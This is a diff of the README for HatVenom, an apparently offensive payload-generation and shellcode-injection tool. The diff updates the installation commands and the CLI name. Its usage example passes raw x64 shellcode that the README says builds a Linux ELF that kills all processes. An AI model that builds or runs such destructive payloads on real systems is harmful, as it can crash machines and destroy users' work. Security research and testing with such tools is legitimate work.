@@ -11,9 +11,7 @@ HatSploit native powerful payload generation and shellcode injection tool that p
 ## Installation
 
 ```shell
-git clone https://github.com/EntySec/HatVenom.git
-cd HatVenom
-sudo python3 setup.py install
+pip3 install git+https://github.com/enty8080/HatVenom
 ```
 
 ## Basic functions
@@ -99,10 +97,10 @@ hatvenom.generate_to('macho', 'x64', shellcode, {'file':'//bin/ps'})
 
 ## HatVenom CLI
 
-HatVenom also has their own command line interface that can be invoked by executing `hatvenom.py`:
+HatVenom also has their own command line interface that can be invoked by executing `hatvenom` command:
 
 ```shell
-usage: hatvenom.py [-h] [--format FORMAT] [--arch ARCH] [--shellcode SHELLCODE] [--offsets OFFSETS] [-o OUTPUT] [-l]
+usage: hatvenom [-h] [--format FORMAT] [--arch ARCH] [--shellcode SHELLCODE] [--offsets OFFSETS] [-o OUTPUT] [-l]
 
 Powerful payload generation and shellcode injection tool that provides support for common platforms and architectures.
 
@@ -123,7 +121,7 @@ optional arguments:
 Let's generate simple payload that kills all processes for Linux and save it to `a.out`.
 
 ```shell
-python3 hatvenom.py --format elf --arch x64 --shellcode "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
+hatvenom --format elf --arch x64 --shellcode "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
 ```
 
 **output:**
